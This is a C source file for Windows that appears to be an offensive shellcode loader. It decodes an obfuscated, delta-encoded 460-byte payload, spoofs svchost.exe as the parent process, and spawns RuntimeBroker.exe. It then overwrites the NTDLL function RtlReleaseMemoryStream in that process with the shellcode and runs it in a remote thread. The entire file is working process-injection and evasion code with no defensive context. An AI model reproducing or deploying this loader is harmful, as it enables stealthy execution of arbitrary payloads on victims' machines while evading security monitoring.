#include "common.h"

int main()
{

	// Payload

	SIZE_T sPayloadSize = 460;
	unsigned char first_byte = 0xfc;
	unsigned char delta[459] = {0x4c, 0x3b, 0x61, 0xc, 0xf8, 0xd8, 0x40, 0x0, 0x0, 0x41, 0x10, 0xf0, 0xf, 0x2, 0xff, 0x5, 0xf2, 0xe9, 0xa1, 0x93, 0xe3, 0x43, 0xc7, 0xe, 0xe8, 0x43, 0xc7, 0xc6, 0x30, 0x43, 0xc7, 0xce, 0x28, 0x43, 0xe7, 0xde, 0xf8, 0xc7, 0xa8, 0x93, 0x0, 0x3, 0xe4, 0x98, 0x7f, 0xe9, 0x8f, 0xec, 0x90, 0x25, 0x1b, 0x86, 0x2a, 0xf4, 0x21, 0x80, 0x8, 0x44, 0x34, 0xc0, 0xc0, 0x21, 0xb, 0x65, 0xef, 0x10, 0xf7, 0x43, 0xc7, 0xce, 0x6b, 0xb7, 0xfa, 0xc, 0xb9, 0xcf, 0xbb, 0xf5, 0x8, 0x78, 0x0, 0x0, 0x48, 0x3d, 0x3b, 0xb4, 0xf3, 0xe1, 0xb9, 0xcf, 0x80, 0x3b, 0xbd, 0xd0, 0x2c, 0x47, 0xb5, 0xe0, 0x29, 0xb8, 0xcf, 0x13, 0x73, 0xf2, 0xb7, 0xca, 0x78, 0x4a, 0xa9, 0x54, 0xc0, 0xb9, 0xd5, 0x77, 0xe4, 0x98, 0x7f, 0xe9, 0x8f, 0xec, 0x95, 0x80, 0x8, 0x44, 0x34, 0xc0, 0xc0, 0x77, 0xa8, 0x95, 0x7c, 0x5b, 0xb7, 0x49, 0xd8, 0xe4, 0x3d, 0xf4, 0x98, 0xa4, 0x63, 0x80, 0xec, 0x47, 0xb5, 0xe4, 0x25, 0xb8, 0xcf, 0x96, 0xdb, 0x4a, 0x81, 0x3c, 0xfc, 0x47, 0xb5, 0xdc, 0x2d, 0xb8, 0xcf, 0x71, 0x4a, 0x79, 0x84, 0xc0, 0xb9, 0xcf, 0x71, 0x17, 0xe9, 0x17, 0x6, 0xfb, 0x1, 0xe7, 0x17, 0xe9, 0x18, 0xe8, 0x19, 0xee, 0x3b, 0x69, 0x34, 0x21, 0x11, 0xad, 0xe1, 0x78, 0xe9, 0x18, 0x1, 0xee, 0x43, 0x87, 0xd7, 0x6e, 0xa8, 0x0, 0x0, 0x5e, 0xec, 0x75, 0xb9, 0xfc, 0xbf, 0x2d, 0xd4, 0xff, 0xce, 0x0, 0x41, 0x15, 0xf3, 0x40, 0x5d, 0x62, 0x39, 0x6b, 0xb4, 0x61, 0xff, 0x0, 0x49, 0x40, 0x5c, 0x64, 0x73, 0x46, 0xfe, 0x0, 0x50, 0x70, 0xe8, 0x21, 0xb7, 0xc1, 0x13, 0xf5, 0x40, 0x5b, 0x68, 0x3d, 0x68, 0x50, 0x79, 0x92, 0x2b, 0xaf, 0xe1, 0xf8, 0xd6, 0x77, 0x3d, 0x61, 0x7e, 0x99, 0x0, 0xff, 0x0, 0x59, 0xe8, 0x79, 0x6f, 0x57, 0xeb, 0x95, 0xff, 0xd6, 0x7b, 0x0, 0xfd, 0xe4, 0x98, 0x84, 0xe4, 0x8f, 0x88, 0xb7, 0xc1, 0x88, 0x41, 0x39, 0x86, 0xb7, 0xc1, 0x88, 0x41, 0x38, 0x80, 0x79, 0x30, 0x25, 0xd0, 0x1, 0x1f, 0xd6, 0x73, 0x41, 0x3e, 0xa3, 0xa6, 0x31, 0x17, 0xf4, 0x3d, 0x59, 0x66, 0x41, 0x70, 0x48, 0x79, 0xdf, 0xc, 0xcf, 0xed, 0x9e, 0xd6, 0x73, 0x39, 0x43, 0x7c, 0xc2, 0xfe, 0x0, 0x49, 0x6f, 0xab, 0xa, 0xf7, 0x9c, 0x0, 0x0, 0x0, 0x0, 0x41, 0xf, 0xf1, 0xf, 0xf8, 0x41, 0x59, 0x75, 0x0, 0x0, 0xf6, 0xe4, 0x8f, 0xaa, 0xa3, 0x4c, 0xe8, 0xf, 0x92, 0x1a, 0x6a, 0x61, 0x7d, 0xe0, 0x30, 0xad, 0x0, 0x47, 0x45, 0xb7, 0xe0, 0xf4, 0xae, 0x3a, 0x68, 0xe0, 0x41, 0x5d, 0x70, 0xfa, 0xf1, 0xf, 0xf1, 0xf, 0xf1, 0xf, 0xf9, 0xb6, 0xc1, 0x81, 0xf, 0xf9, 0xb6, 0xc9, 0x85, 0x3c, 0x38, 0x8b, 0x3d, 0x38, 0x80, 0x79, 0xbf, 0x53, 0x73, 0x47, 0x79, 0xd6, 0x73, 0xe9, 0xa1, 0x76, 0xb7, 0xcb, 0xc1, 0x83, 0x33, 0x79, 0x4e, 0x7f, 0x96, 0x43, 0x9f, 0xd6, 0xe6, 0x35, 0xc5, 0xed, 0xb4, 0xeb, 0x79, 0xec, 0xef, 0x28, 0xe0, 0x62, 0xd6, 0x73, 0x3b, 0x41, 0x64, 0x14, 0xca, 0x76, 0x8e, 0x76, 0x7b, 0xe5, 0x95, 0x90, 0xb6, 0x8c, 0xcc, 0x5f, 0xfd, 0xfb, 0x96, 0x59, 0xe8, 0x48, 0x51, 0x25, 0xd6 };
	unsigned char pPayload[460] = { 0x00 };
	unsigned int i, index;
	int cap = sizeof(delta) / sizeof(delta[0]);
	pPayload[0] = first_byte;
	for (i = 0; i < cap; i++)
	{
			index = i + 1;
			pPayload[index] = pPayload[i] + delta[i];
	}
	// Retrieve parent PID for spoof
	DWORD dwParentID = NULL;
	HANDLE hParent = NULL;
	LPWSTR sProcessName = "svchost.exe";
	FindPPID(sProcessName, &hParent, &dwParentID);

	// Create spoofed windows process
	DWORD dwProcessID = 1;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPWSTR sCreate = "RuntimeBroker.exe";
	CreateSpoofedProcess(hParent, sCreate, &dwProcessID, &hProcess, &hThread);
	printf("PID: %ld\n", dwProcessID);
	
	// Stomp an imported function within spoofed process
	LPCWSTR sStompModule = L"NTDLL.DLL";
	LPCSTR sStompFunction = "RtlReleaseMemoryStream";
	PVOID pAddress = StompRemoteFunction(hProcess, sStompModule, sStompFunction, pPayload, sPayloadSize);

	// Execute a thread of stomped function
	RemoteThreadExecute(hProcess, pAddress);

	return EXIT_SUCCESS;
}